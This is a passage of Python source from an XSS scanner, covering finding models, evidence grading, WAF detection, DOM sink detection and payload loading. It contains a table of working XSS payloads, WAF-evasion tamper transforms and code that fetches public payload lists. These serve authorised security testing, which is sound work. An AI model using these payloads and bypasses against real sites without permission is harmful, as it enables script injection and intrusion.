        ("fuzz_params", "param-fuzz"),
        ("scan_headers", "headers"),
        ("stored", "stored"),
        ("path_xss", "path"),
        ("fragment_xss", "fragment"),
        ("dom", "dom"),
        ("websocket", "websocket"),
        ("external_tools", "external"),
    )
    for flag, label in vector_flags:
        if getattr(args, flag, False) and label not in vectors:
            vectors.append(label)
    if getattr(args, "blind", None) or getattr(args, "interactsh", None):
        vectors.append("blind-xss")

    shown = vectors[:6]
    vector_text = ", ".join(shown)
    if len(vectors) > len(shown):
        vector_text += f" +{len(vectors) - len(shown)}"

    if getattr(args, "report_reflections", False):
        evidence = "executable + inert reflections (opt-in leads)"
    else:
        evidence = "executable evidence only (inert reflections skipped)"

    reports = str(getattr(args, "report", "all") or "all")
    if reports.lower() in ("none", ""):
        artifacts = "console only"
    else:
        report_dir = getattr(args, "report_dir", os.path.join(DEFAULT_STATE_DIR, "reports"))
        artifacts = f"{reports} -> {report_dir}"

    rows = [
        ("TARGET", target),
        ("PROFILE", f"{profile} / {mode}"),
        ("VECTORS", vector_text),
        ("EVIDENCE", evidence),
        ("ARTIFACTS", artifacts),
    ]
    oob = getattr(args, "blind", None) or getattr(args, "interactsh", None)
    if oob:
        rows.append(("OOB", str(oob)))
    return rows

# --------------------------------------------------------------------------------------
# Data models
# --------------------------------------------------------------------------------------


def reflection_confidence(
    info: ReflectionInfo,
    *,
    requested: bool,
    available: bool,
    content_type: str = "",
) -> Tuple[str, str, str]:
    """Classify an HTTP-reflection finding as ``(confidence, rationale, detail)``.

    The distinction that matters is *why* a browser did not confirm execution:
    verification disabled, no browser worker available, the candidate failed
    the prequalification gate, or a browser ran and found nothing.  Collapsing
    those into one bucket either overstates or understates the evidence.
    """
    prequalified = browser_prequalified(info, content_type)
    if not info.executable:
        return (
            "low",
            f"Reflection was observed but is inert: "
            f"{info.inert_reason or info.context}.",
            "Reflection is not executable in this context",
        )
    if not requested:
        return (
            "high",
            "The payload's delimiters survived verbatim in an executable "
            "context; browser verification was disabled.",
            "HTTP evidence only (browser verification disabled)",
        )
    if available and prequalified:
        return (
            "medium",
            "A browser was available and this candidate passed the execution "
            "gate, but the browser did not observe execution.",
            "Browser verification attempted but did not confirm execution",
        )
    if available:
        return (
            "medium",
            "A browser was available but the candidate did not pass the "
            "browser prequalification gate (MIME/context/static dead zone).",
            "Browser verification did not run for this candidate",
        )
    return (
        "high",
        "Browser verification was requested but no browser worker was "
        "available; the payload's delimiters survived verbatim in an "
        "executable context.",
        "Browser verification unavailable",
    )


@dataclass
class Finding:
    kind: str
    url: str
    parameter: str
    method: str
    payload: str
    evidence: str = ""
    confidence: str = "confirmed"  # confirmed | high | medium | low
    confidence_rationale: str = ""
    context: str = ""
    detail: str = ""
    screenshot: str = ""
    # Reproduction proof.  `poc_url` is a ready-to-open URL (GET points);
    # `poc_command` is a shell command (POST/header/cookie points).  Both are
    # built from the injection only - no cookies or session data are included.
    poc_url: str = ""
    poc_command: str = ""
    # Browser-ready form PoC (base64 data URL) for POST form points.
    poc_html: str = ""
    # Complete evidence.  `request` holds the redacted method/URL/headers/body
    # that produced the response, `response_excerpt` shows ±100 chars around
    # the marker, and `poc_curl` is always populated so every finding is
    # copy-paste reproducible regardless of method.
    request: Dict[str, Any] = field(default_factory=dict)
    response_status: int = 0
    response_excerpt: str = ""
    poc_curl: str = ""
    # Browser-confirmed sink detail.
    sink: str = ""
    dom_path: str = ""
    # Special-character reflection matrix (allowed/escaped/filtered/replaced).
    char_matrix: Dict[str, str] = field(default_factory=dict)
    # Blind/OOB callback detail (cookies, page URL, timestamp, raw callback).
    oob: Dict[str, Any] = field(default_factory=dict)
    # Identity: `source` disambiguates query/form/header/cookie points that
    # share a URL and parameter; `finding_id` is the stable --replay handle.
    source: str = ""
    param_source: str = "discovered"  # discovered | fuzzed
    finding_id: str = ""
    subkey: str = ""
    tags: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=now_iso)

    def __post_init__(self) -> None:
        # Old checkpoints may not carry the new identity/evidence fields.
        if not isinstance(self.request, dict):
            self.request = {}
        if not isinstance(self.oob, dict):
            self.oob = {}
        if not isinstance(self.char_matrix, dict):
            self.char_matrix = {}
        if not self.subkey:
            self.subkey = ""
        if not self.finding_id:
            self.finding_id = make_finding_id(self.key())
        if not self.poc_curl:
            self.poc_curl = finding_curl(self)

    def key(self) -> str:
        # Family-level key: "Reflected XSS (HTTP evidence)" and "Reflected XSS" collapse,
        # and payload variants on the same injection point are de-duplicated.  Some
        # findings (secrets, static DOM flows) legitimately share a URL/parameter, so
        # they can opt into an extra subkey.  The canonical URL strips the query for
        # query/form/JSON points (the parameter already identifies the point), which
        # prevents a payload-bearing URL from duplicating an existing finding while
        # still keeping distinct sources (query vs header vs DOM) apart.
        family = self.kind.split(" (")[0]
        url = canonical_finding_url(self.url, self.source)
        raw = "|".join([family, url, self.parameter, self.method, self.source, self.subkey])
        return hashlib.sha1(raw.encode("utf-8", "replace")).hexdigest()

    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        if not result["finding_id"]:
            result["finding_id"] = make_finding_id(self.key())
        if not result["poc_curl"]:
            result["poc_curl"] = finding_curl(self)
        if not result["confidence_rationale"]:
            result["confidence_rationale"] = {
                "confirmed": "Direct confirmation evidence was recorded for this finding.",
                "high": "Strong technical evidence was recorded; browser execution was not recorded for this finding.",
                "medium": "A supporting signal was observed without direct execution proof.",
                "low": "A heuristic signal needs manual validation.",
            }.get(self.confidence, "Confidence was not classified; review the evidence manually.")
        return result


CONFIDENCE_LEVELS = ("confirmed", "high", "medium", "low")


def enforce_finding_policy(finding: Finding) -> bool:
    """Normalise confidence and reject claims that are not evidence-backed.

    The scanner intentionally produces a small number of graded findings rather
    than a long reflection list.  This gate is the last line of defence: an
    invalid or empty finding is dropped, and a ``confirmed``/``high`` claim
    without any recorded evidence is downgraded instead of being printed as
    fact.  It mutates ``finding`` in place and returns False only when the
    finding is unusable.
    """
    if not (finding.kind or "").strip() or not (finding.url or "").strip():
        return False

    confidence = (finding.confidence or "").strip().lower()
    if confidence not in CONFIDENCE_LEVELS:
        confidence = "low"

    has_evidence = any(
        (
            (finding.evidence or "").strip(),
            (finding.response_excerpt or "").strip(),
            (finding.screenshot or "").strip(),
            bool(finding.oob),
            bool(finding.request),
        )
    )
    if confidence == "confirmed" and not has_evidence:
        confidence = "high"
        finding.confidence_rationale = (
            "Downgraded from confirmed: no execution evidence was recorded."
        )
    elif confidence == "high" and not has_evidence:
        confidence = "medium"
        finding.confidence_rationale = (
            "Downgraded from high: no request or response evidence was recorded."
        )

    finding.confidence = confidence
    return True


# Validation outcomes (execution-based validation pipeline)
CONFIRMED_EXECUTION = "CONFIRMED_EXECUTION"
REJECTED = "REJECTED"
UNVERIFIED = "UNVERIFIED"

# Classifications for non-confirmed candidates
FALSE_POSITIVE = "FALSE_POSITIVE"
NEEDS_MANUAL_TEST = "NEEDS_MANUAL_TEST"


@dataclass
class ValidationResult:
    status: str  # CONFIRMED_EXECUTION | REJECTED | UNVERIFIED
    classification: Optional[str] = None  # FALSE_POSITIVE | NEEDS_MANUAL_TEST | None
    reason: str = ""
    evidence: str = ""
    dialog_text: Optional[str] = None
    in_dom: bool = False
    in_response: bool = False
    screenshot: str = ""


@dataclass
class ScanStats:
    requests: int = 0
    errors: int = 0
    truncated_responses: int = 0
    blocked: int = 0
    payloads: int = 0
    points: int = 0
    urls_total: int = 0
    urls_done: int = 0
    urls_failed: int = 0
    findings: int = 0
    browser_checks: int = 0
    endpoints: int = 0
    js_files: int = 0
    secrets: int = 0
    subdomains: int = 0
    passive_urls: int = 0
    fuzzed_paths: int = 0
    discovered_params: int = 0
    ast_flows: int = 0
    oob_registered: int = 0
    oob_hits: int = 0
    external_findings: int = 0
    false_positives: int = 0
    needs_manual_test: int = 0
    rejections: Dict[str, int] = field(default_factory=dict)
    started: float = field(default_factory=time.time)

    @property
    def elapsed(self) -> float:
        return time.time() - self.started


@dataclass
class FormField:
    name: str
    value: str = ""
    type: str = "text"
    tag: str = "input"


@dataclass
class InjectionPoint:
    url: str
    method: str
    param: str
    value: str = ""
    # query | form | json | cookie | header | path | fragment | api | websocket
    source: str = "query"
    param_source: str = "discovered"  # discovered | fuzzed
    form_index: Optional[int] = None
    fields: Dict[str, FormField] = field(default_factory=dict)
    page_url: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    json_body: Dict[str, Any] = field(default_factory=dict)
    content_type: str = ""
    fragment: str = ""
    path_index: int = -1
    body_text: str = ""
    extra: Dict[str, Any] = field(default_factory=dict)

    def key(self) -> str:
        return "|".join(
            [self.source, self.method, self.url, self.param, str(self.form_index), str(self.path_index)]
        )


@dataclass
class WAFReport:
    names: List[str] = field(default_factory=list)
    blocking: bool = False

    def __bool__(self) -> bool:
        return bool(self.names)

    def label(self) -> str:
        return ", ".join(self.names) if self.names else "none detected"


# --------------------------------------------------------------------------------------
# Rate limiting
# --------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------
# WAF fingerprinting
# --------------------------------------------------------------------------------------


class WAFDetector:
    HEADER_SIGNATURES = HEADER_SIGNATURES
    BODY_SIGNATURES = BODY_SIGNATURES
    BLOCK_WORDS = BLOCK_WORDS

    def __init__(self, engine: HttpEngine, console: Console, target: str):
        self.engine = engine
        self.console = console
        self.target = target

    async def detect(self) -> WAFReport:
        report = WAFReport()
        response = await self.engine.get(self.target, cache=False)
        if response.error:
            return report

        if fingerprint_waf is not None:
            report.names = fingerprint_waf(
                response.headers, response.text, response.header("set-cookie", "")
            )

        probe_url = merge_query(self.target, {"xoxss_waf_probe": "<script>alert(1)</script>"})
        probe = await self.engine.get(probe_url, allow_redirects=False)
        if probe.error is None and looks_blocked is not None:
            if looks_blocked(probe.status, probe.text, self.BLOCK_WORDS):
                report.blocking = True
                if not report.names:
                    report.names.append("Generic/Unknown WAF")

        report.names = sorted(set(report.names))
        if report.names:
            message = f"WAF detected: {', '.join(report.names)}"
            if report.blocking:
                message += " (payload probe was blocked - consider --tamper)"
            self.console.warn(message)
        else:
            self.console.info("No WAF fingerprint matched")
        return report

# --------------------------------------------------------------------------------------
# Tamper techniques
# --------------------------------------------------------------------------------------


def _random_case(value: str) -> str:
    return "".join(ch.upper() if random.random() < 0.5 else ch.lower() for ch in value)


def tamper_uppercase(payload: str) -> str:
    """Randomise only case-insensitive parts (tag names, event names, scheme)."""
    payload = re.sub(r"<([a-zA-Z][a-zA-Z0-9]*)", lambda m: "<" + _random_case(m.group(1)), payload)
    payload = re.sub(r"\b(on[a-zA-Z]+)(\s*=)", lambda m: _random_case(m.group(1)) + m.group(2), payload)
    payload = re.sub(r"\b(javascript|data)\s*:", lambda m: _random_case(m.group(1)) + ":", payload, flags=re.I)
    return payload


def tamper_doubleencode(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")


def tamper_hexencode(payload: str) -> str:
    return "".join(f"%{ord(ch):02X}" for ch in payload)


def tamper_urlencode(payload: str) -> str:
    return quote(payload, safe="")


def tamper_jsonfuzz(payload: str) -> str:
    encoded = json.dumps(payload)[1:-1]
    return encoded.replace("<", "\\u003c").replace(">", "\\u003e").replace("&", "\\u0026")


def tamper_htmlentities(payload: str) -> str:
    return (
        payload.replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
    )


def tamper_spacetab(payload: str) -> str:
    return payload.replace(" ", "\t")


def tamper_jscomment(payload: str) -> str:
    return payload.replace(";", ";/**/").replace(" ", "/**/")


TAMPERS = {
    "doubleencode": tamper_doubleencode,
    "uppercase": tamper_uppercase,
    "hexencode": tamper_hexencode,
    "urlencode": tamper_urlencode,
    "jsonfuzz": tamper_jsonfuzz,
    "htmlentities": tamper_htmlentities,
    "spacetab": tamper_spacetab,
    "jscomment": tamper_jscomment,
}

# "all" is deliberately limited to transforms that keep the payload semantically valid.
TAMPER_CHAINS = {
    "all": ["spacetab", "uppercase"],
}


def apply_tamper(payload: str, name: Optional[str]) -> str:
    if not name:
        return payload
    if name in TAMPER_CHAINS:
        result = payload
        for step in TAMPER_CHAINS[name]:
            result = TAMPERS[step](result)
        return result
    func = TAMPERS.get(name)
    return func(payload) if func else payload


# --------------------------------------------------------------------------------------
# Payload engine
# --------------------------------------------------------------------------------------

DEFAULT_PAYLOADS: Dict[str, List[str]] = {
    "html": [
        "<script>{m}</script>",
        "<img src=x onerror=\"{m}\">",
        "<svg onload=\"{m}\">",
        "<details open ontoggle=\"{m}\">",
        "<input autofocus onfocus=\"{m}\">",
        "<body onload=\"{m}\">",
        "<iframe srcdoc=\"<script>{m}</script>\">",
        "<video><source onerror=\"{m}\"></video>",
        "<math><mtext><table><mglyph><style><img src=x onerror=\"{m}\">",
    ],
    "attr_double": [
        "\" onmouseover=\"{m}\" x=\"",
        "\" autofocus onfocus=\"{m}\" x=\"",
        "\"><script>{m}</script>",
        "\"><img src=x onerror=\"{m}\">",
        "\" onpointerover=\"{m}\" x=\"",
    ],
    "attr_single": [
        "' onmouseover='{m}' x='",
        "' autofocus onfocus='{m}' x='",
        "'><script>{m}</script>",
        "'><img src=x onerror='{m}'>",
    ],
    "attr_unquoted": [
        " onmouseover={m} x=",
        " autofocus onfocus={m} x=",
        "><script>{m}</script>",
    ],
    "script": [
        "';{m};//",
        "\";{m};//",
        "</script><script>{m}</script>",
        "`;{m};//",
        "*/{m}/*",
        "\\';{m};//",
    ],
    "style": [
        "</style><script>{m}</script>",
        "</style><img src=x onerror=\"{m}\">",
    ],
    "comment": [
        "--><script>{m}</script><!--",
        "--!><script>{m}</script><!--",
        "--><img src=x onerror=\"{m}\"><!--",
    ],
    "json": [
        "\\u003cscript\\u003e{m}\\u003c/script\\u003e",
        "\\u003cimg src=x onerror={m}\\u003e",
        "</script><script>{m}</script>",
    ],
    "url": [
        "javascript:{m}",
        "javascript:/*{m}*/",
    ],
    "generic": [
        "<script>{m}</script>",
        "\"><img src=x onerror=\"{m}\">",
        "'><svg onload='{m}'>",
        "<img src=x onerror=\"{m}\">",
    ],
}


def _plausible_remote_payload(line: str) -> bool:
    """Filter noise out of the downloaded lists (headings, prose, URLs, ...)."""
    if not line or len(line) > 2048:
        return False
    if line.startswith(("#", "//", "<!--", "/*", "*", "|", "-", ">")):
        return False
    lowered = line.lower()
    stripped = lowered.strip()
    if stripped in {"<html>", "</html>", "<body>", "</body>", "<head>", "</head>", "<!doctype html>"}:
        return False
    if lowered.startswith(("http://", "https://")) and "<" not in line:
        return False
    if "<" in line:
        return True
    if "javascript:" in lowered:
        return True
    if re.search(r"\bon[a-z]{3,}\s*=", lowered):
        return True
    if re.search(r"\b(?:alert|prompt|confirm)\s*\(", lowered):
        return True
    return False


def classify_remote_payload(payload: str) -> str:
    lowered = payload.lower()
    stripped = payload.lstrip()
    if "javascript:" in lowered:
        return "url"
    if "</script" in lowered or lowered.startswith(("';", "\";", "`;")):
        return "script"
    if stripped.startswith('"'):
        return "attr_double"
    if stripped.startswith("'"):
        return "attr_single"
    if "<script" in lowered or "srcdoc" in lowered:
        return "html"
    return "generic"


def embed_marker(payload: str, marker: str, context: str = "") -> str:
    """Insert the quote-free execution marker into an arbitrary payload."""
    if re.search(r"<script[^>]*\bsrc\s*=", payload, re.I):
        return f"{payload}<script>{marker}</script>"
    if re.search(r"</script\s*>", payload, re.I):
        return re.sub(r"</script\s*>", lambda match: f";{marker}" + match.group(0), payload, count=1, flags=re.I)
    if context in ("script", "url"):
        return f"{payload};{marker}"
    quoted = re.search(r"(on[a-zA-Z]+\s*=\s*)([\"'])(.*?)\2", payload, re.S | re.I)
    if quoted:
        return (
            payload[: quoted.start(3)]
            + quoted.group(3)
            + ";"
            + marker
            + payload[quoted.end(3):]
        )
    unquoted = re.search(r"(on[a-zA-Z]+\s*=\s*)([^\s>]+)", payload, re.I)
    if unquoted:
        return payload[: unquoted.end(2)] + ";" + marker + payload[unquoted.end(2):]
    if payload.lstrip().lower().startswith("javascript:"):
        return f"{payload};{marker}"
    return f"{payload}<script>{marker}</script>"


def payload_workdir(base_dir: Optional[str] = None) -> Path:
    """Temp directory for this run's payloads (``/tmp`` on POSIX, ``%TEMP%`` on Windows)."""
    root = Path(base_dir) if base_dir else Path(os.environ.get("XOXSS_TMPDIR") or tempfile.gettempdir())
    return root / f"xoxss-payloads-{os.getpid()}-{uuid.uuid4().hex[:8]}"


def download_payload_lists(
    console: Console,
    sources: Sequence[str],
    limit: int,
    base_dir: Optional[str] = None,
    work_dir: Optional[Path] = None,
) -> Tuple[List[Path], Optional[Path]]:
    """Download public XSS payload lists into a throw-away temp directory.

    Returns ``(files, workdir)``. ``workdir`` must be passed to
    :func:`cleanup_payload_lists` when the scan is over.
    """
    if limit <= 0 or limit > MAX_REMOTE_PAYLOADS:
        limit = MAX_REMOTE_PAYLOADS
    work = work_dir or payload_workdir(base_dir)
    try:
        work.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        console.warn(f"Cannot create temporary payload directory {work}: {exc}")
        return [], None

    console.info(f"Downloading XSS payload lists ({len(sources)} source(s)) -> {work}")
    batches: List[List[str]] = []
    seen: Set[str] = set()
    for url in sources:
        try:
            request = urllib.request.Request(
                url,
                headers={"User-Agent": USER_AGENT, "Accept": "text/plain,*/*"},
            )
            with urllib.request.urlopen(request, timeout=25) as response:
                raw = response.read(MAX_PAYLOAD_BYTES + 1)
            if len(raw) > MAX_PAYLOAD_BYTES:
                raw = raw[:MAX_PAYLOAD_BYTES]
            text = raw.decode("utf-8", "replace")
        except Exception as exc:
            console.warn(f"Payload source failed ({type(exc).__name__}: {exc}): {truncate(url, 110)}")
            continue

        batch: List[str] = []
        for raw_line in text.splitlines():
            line = raw_line.strip()
            if not _plausible_remote_payload(line) or line in seen:
                continue
            seen.add(line)
            batch.append(line)
            if len(batch) >= limit:
                break
        if batch:
            batches.append(batch)
            console.debug(f"{truncate(url, 100)} -> {len(batch)} candidate payload(s)")
        else:
            console.debug(f"No usable payloads found in {truncate(url, 110)}")

    if not batches:
        shutil.rmtree(work, ignore_errors=True)
        console.warn("Remote payload download failed; using built-in payloads")
        return [], None

    # Round-robin across sources so every list contributes even with a small limit.
    chosen: List[str] = []
    cursor = 0
    while len(chosen) < limit:
        progressed = False
        for batch in batches:
            if cursor < len(batch) and len(chosen) < limit:
                chosen.append(batch[cursor])
                progressed = True
        if not progressed:
            break
        cursor += 1

    path = work / "payloads.txt"
    try:
        path.write_text("\n".join(chosen) + "\n", encoding="utf-8")
    except OSError as exc:
        console.warn(f"Cannot write payload cache {path}: {exc}")
        shutil.rmtree(work, ignore_errors=True)
        return [], None

    console.ok(f"Loaded {len(chosen)} remote XSS payload(s) into temporary storage", important=False)
    return [path], work


def cleanup_payload_lists(work: Optional[Path], keep: bool, console: Console) -> None:
    if work is None:
        return
    if keep:
        console.info(f"Keeping temporary payloads at {work} (--keep-payloads)")
        return
    shutil.rmtree(work, ignore_errors=True)
    console.debug(f"Removed temporary payload directory {work}")


LAZY_PAYLOAD_FILE = Path(__file__).resolve().parent / "data" / "lazyxss.txt"


class PayloadEngine:
    CONTEXTS = tuple(DEFAULT_PAYLOADS.keys())

    def __init__(
        self,
        console: Console,
        extra_file: Optional[str] = None,
        remote_files: Optional[Sequence[str]] = None,
        corpus_dirs: Optional[Sequence[str]] = None,
        lazy_payloads: bool = True,
    ):
        self.console = console
        self.payloads: Dict[str, List[str]] = {key: list(value) for key, value in DEFAULT_PAYLOADS.items()}
        self.remote_payloads: List[str] = []
        self.lazy_payloads: List[str] = []
        self._lazy_by_context: Dict[str, List[str]] = {}
        self._lazy_pool_cache: Dict[str, List[str]] = {}
        self._remote_set: Set[str] = set()
        self._seen: Set[str] = {payload for values in self.payloads.values() for payload in values}
        # A payload may deliberately live in more than one context (classified
        # context + generic fallback), so de-duplicate per slot, not per string.
        self._seen_slots: Set[Tuple[str, str]] = {
            (context, payload)
            for context, values in self.payloads.items()
            for payload in values
        }
        if extra_file:
            for path in extra_file.split(os.pathsep):
                if path.strip():
                    self._load_file(path.strip())
        for directory in corpus_dirs or []:
            self._load_dir(directory)
        for path in remote_files or []:
            self._load_file(path, remote=True, quiet=True)
        if lazy_payloads:
            self._load_lazy_corpus()

    def _load_lazy_corpus(self, limit: int = 12000) -> None:
        """Load the bundled LazyXss corpus as an extended, context-classified pool.

        The corpus is kept separate from ``payloads`` so the hand-curated
        context payloads still receive most slots.  ``payloads_for`` reserves a
        share of each batch for this pool, which keeps 7k payloads from pushing
        the reliable built-ins out of the way.
        """
        path = LAZY_PAYLOAD_FILE
        if not path.is_file():
            self.console.debug(f"Bundled payload pack not found: {path}")
            return
        added = 0
        seen: Set[str] = set()
        try:
            with open(path, "r", encoding="utf-8-sig", errors="replace") as handle:
                for raw in handle:
                    payload = raw.strip()
                    if not payload or len(payload) > 2048:
                        continue
                    if payload in seen or payload in self._seen:
                        continue
                    # Reject prose/headings while keeping fragment and comment
                    # payloads (e.g. ``#<script>``) that are valid for DOM sinks.
                    lowered = payload.lower()
                    if not any(
                        marker in lowered
                        for marker in (
                            "<", "javascript:", "onerror", "onload", "onfocus",
                            "alert", "prompt", "confirm", "eval(", "settimeout(",
                            "%3c", "&lt;", "&lpar;", "&#", "svg", "script",
                            "iframe", "srcdoc", "formaction", "document.",
                            "window[", "top[", "constructor", "\\x", "\\u",
                        )
                    ):
                        continue
                    seen.add(payload)
                    self.lazy_payloads.append(payload)
                    context = classify_remote_payload(payload)
                    self._lazy_by_context.setdefault(context, []).append(payload)
                    if context != "generic":
                        self._lazy_by_context.setdefault("generic", []).append(payload)
                    added += 1
                    if added >= limit:
                        break
        except OSError as exc:
            self.console.warn(f"Could not read bundled payload pack {path}: {exc}")
            return
        if added:
            self.console.ok(
                f"Bundled LazyXss payload pack: {added} payload(s) ({path.name})",
                important=False,
            )

    def _load_dir(self, directory: str) -> None:
        root = Path(directory).expanduser()
        if not root.is_dir():
            self.console.warn(f"Payload directory not found: {directory}")
            return
        files = sorted(
            path
            for path in root.rglob("*")
            if path.is_file() and path.suffix.lower() in (".txt", ".lst", ".json")
        )
        if not files:
            self.console.warn(f"No .txt/.lst/.json payload files under {directory}")
            return
        for path in files:
            self._load_file(str(path))
        self.console.ok(f"Payload corpus: {len(files)} file(s) under {directory}", important=False)

    def _load_json(self, path: str, quiet: bool = False) -> int:
        added = 0
        try:
            with open(path, "r", encoding="utf-8-sig", errors="replace") as handle:
                data = json.load(handle)
        except (OSError, ValueError) as exc:
            self.console.warn(f"Could not read payload JSON {path}: {exc}")
            return 0
        items = data.get("payloads") if isinstance(data, dict) else data
        if not isinstance(items, list):
            self.console.warn(f"Payload JSON {path} is not a list: expected [\"payload\", ...]")
            return 0
        for item in items:
            if isinstance(item, str):
                payload, context = item.strip(), "generic"
                if "|" in payload:
                    prefix, rest = payload.split("|", 1)
                    if prefix.strip().lower() in self.payloads:
                        context, payload = prefix.strip().lower(), rest.strip()
            elif isinstance(item, dict):
                payload = str(item.get("payload") or "").strip()
                context = str(item.get("context") or "generic").lower()
            else:
                continue
            if not payload or payload.startswith("#"):
                continue
            if context not in self.payloads:
                context = "generic"
            if self._register(context, payload):
                added += 1
        if not quiet and added:
            self.console.ok(f"Loaded {added} payload(s) from {path}", important=False)
        return added

    def _register(self, context: str, payload: str) -> bool:
        slot = (context, payload)
        if slot in self._seen_slots:
            return False
        self._seen_slots.add(slot)
        self._seen.add(payload)
        self.payloads.setdefault(context, []).append(payload)
        return True

    def _load_file(self, path: str, remote: bool = False, quiet: bool = False) -> None:
        if Path(path).suffix.lower() == ".json":
            self._load_json(path, quiet=quiet)
            return
        added = 0
        try:
            with open(path, "r", encoding="utf-8-sig", errors="replace") as handle:
                for raw in handle:
                    line = raw.strip()
                    if not line or line.startswith("#"):
                        continue
                    context = "generic"
                    payload = line
                    explicit = False
                    if "|" in line:
                        prefix, rest = line.split("|", 1)
                        if prefix.strip().lower() in self.payloads:
                            context = prefix.strip().lower()
                            payload = rest.strip()
                            explicit = True
                    if remote:
                        if not _plausible_remote_payload(payload):
                            continue
                        classified = classify_remote_payload(payload)
                        if payload not in self._remote_set:
                            self._remote_set.add(payload)
                            self.remote_payloads.append(payload)
                        self._register(classified, payload)
                        if classified != "generic":
                            self._register("generic", payload)
                        added += 1
                    else:
                        # Untagged corpus lines are classified so they are not all
                        # tested against every context.  The payload is still
                        # registered as generic for unknown contexts.
                        if not explicit:
                            classified = classify_remote_payload(payload)
                            if classified != "generic":
                                context = classified
                        if self._register(context, payload):
                            added += 1
                        if context != "generic":
                            self._register("generic", payload)
        except OSError as exc:
            self.console.warn(f"Could not read payload file {path}: {exc}")
            return
        if not quiet and added:
            self.console.ok(f"Loaded {added} custom payloads from {path}", important=False)

    def probe(self, token: str) -> str:
        return f"{token} <>\"'`()=/\\\\"

    def _lazy_pool_for(self, context: str) -> List[str]:
        cached = self._lazy_pool_cache.get(context)
        if cached is not None:
            return cached
        contexts: List[str] = []
        if context in self._lazy_by_context:
            contexts.append(context)
        if "generic" in self._lazy_by_context:
            contexts.append("generic")
        seen: Set[str] = set(self._seen)
        pool: List[str] = []
        for ctx in contexts:
            for template in self._lazy_by_context.get(ctx, []):
                if template in seen:
                    continue
                seen.add(template)
                pool.append(template)
        self._lazy_pool_cache[context] = pool
        return pool

    def payloads_for(self, context: str, limit: Optional[int] = None) -> List[str]:
        contexts = [context] if context in self.payloads else []
        for fallback in ("generic", "html"):
            if fallback not in contexts:
                contexts.append(fallback)
        seen: Set[str] = set()
        base: List[str] = []
        for ctx in contexts:
            for template in self.payloads.get(ctx, []):
                if template in seen or template in self._remote_set:
                    continue
                seen.add(template)
                base.append(template)

        lazy_pool = self._lazy_pool_for(context)

        if limit is None:
            return (
                base
                + [payload for payload in self.remote_payloads if payload not in seen]
                + lazy_pool
            )

        limit = max(1, limit)
        used: Set[str] = set()
        result: List[str] = []

        def take(pool: Sequence[str], quota: int) -> None:
            if quota <= 0:
                return
            candidates = [item for item in pool if item not in used and item not in result]
            if not candidates:
                return
            chosen = random.sample(candidates, quota) if len(candidates) > quota else candidates
            for item in chosen:
                if item not in used:
                    used.add(item)
                    result.append(item)

        if lazy_pool:
            # 50% curated, 30% LazyXss, 20% downloaded corpus.  At least one
            # curated payload is always kept so small limits stay reliable.
            base_quota = max(1, limit // 2)
            lazy_quota = min(max(1, int(limit * 0.3)), max(0, limit - base_quota))
            remote_quota = max(0, limit - base_quota - lazy_quota)
            if not self.remote_payloads:
                lazy_quota += remote_quota
                remote_quota = 0
            take(base[:base_quota], base_quota)
            take(lazy_pool, lazy_quota)
            take(self.remote_payloads, remote_quota)
            # Fill any shortfall (small pools, duplicates) from the remaining
            # curated payloads first, then the extended pools.
            take(base[base_quota:], limit - len(result))
            take(lazy_pool, limit - len(result))
            take(self.remote_payloads, limit - len(result))
        else:
            remote_quota = max(1, limit // 3) if self.remote_payloads else 0
            base_quota = max(0, limit - remote_quota)
            take(base, base_quota)
            take(self.remote_payloads, remote_quota)
            take(base[base_quota:], limit - len(result))
        return result[:limit]

    def render(self, template: str, token: str, context: str = "") -> str:
        marker = js_marker(token)
        codes = ",".join(str(ord(ch)) for ch in token)
        # Substitute alert(1) and generic dialog calls with the unique per-payload marker
        template = _DIALOG_CALL_RE.sub(
            lambda m: f"{m.group('fn')}(String.fromCharCode({codes}))",
            template,
        )
        if "{m}" in template:
            return template.replace("{m}", marker)
        if "{t}" in template:
            return template.replace("{t}", token)
        return embed_marker(template, marker, context)


# --------------------------------------------------------------------------------------
# DOM analysis (static hints + runtime sink instrumentation)
# --------------------------------------------------------------------------------------

DOM_SOURCES = [
    "document.url",
    "document.documenturi",
    "document.baseuri",
    "location.hash",
    "location.search",
    "location.href",
    "document.referrer",
    "window.name",
    "document.cookie",
    "localstorage",
    "sessionstorage",
    "history.state",
    "postmessage",
    "window.location",
]

DOM_SINKS = [
    ("innerHTML", r"\.innerHTML\s*="),
    ("outerHTML", r"\.outerHTML\s*="),
    ("insertAdjacentHTML", r"insertAdjacentHTML\s*\("),
    ("document.write", r"document\.write\s*\("),
    ("document.writeln", r"document\.writeln\s*\("),
    ("eval", r"\beval\s*\("),
    ("Function", r"\bnew\s+Function\s*\("),
    ("setTimeout", r"\bsetTimeout\s*\("),
    ("setInterval", r"\bsetInterval\s*\("),
    ("location.assign", r"location\.(?:assign|replace)\s*\("),
    ("jQuery.html", r"\.html\s*\("),
    ("jQuery.append", r"\.(?:append|prepend|after|before)\s*\("),
    ("srcdoc", r"\.srcdoc\s*="),
]


@dataclass
class DomScript:
    url: str
    content: str
    inline: bool = True


def extract_scripts(base_url: str, html_text: str) -> List[DomScript]:
    if not HAS_BS4:
        return []
    soup = _soup(html_text)
    scripts: List[DomScript] = []
    for tag in soup.find_all("script"):
        src = tag.get("src")
        if isinstance(src, str) and src:
            scripts.append(DomScript(url=urljoin(base_url, src), content="", inline=False))
        elif tag.string:
            scripts.append(DomScript(url=base_url, content=tag.string, inline=True))
    return scripts


def static_dom_candidates(scripts: Sequence[DomScript]) -> List[Dict[str, str]]:
    candidates: List[Dict[str, str]] = []
    for script in scripts:
        content = script.content or ""
        lowered = content.lower()
        if not content:
            continue
        for sink_name, sink_re in DOM_SINKS:
            for match in re.finditer(sink_re, content, re.IGNORECASE):
                window = lowered[max(0, match.start() - 700): match.start()]
                source = next((src for src in DOM_SOURCES if src in window), "")
                if source:
                    snippet = re.sub(r"\s+", " ", content[max(0, match.start() - 80): match.end() + 120])
                    candidates.append(
                        {
                            "source": source,
                            "sink": sink_name,
                            "script": script.url,
                            "snippet": snippet,
                        }
                    )
                    break  # one candidate per sink occurrence
    return candidates


def has_dom_sink(content: str) -> bool:
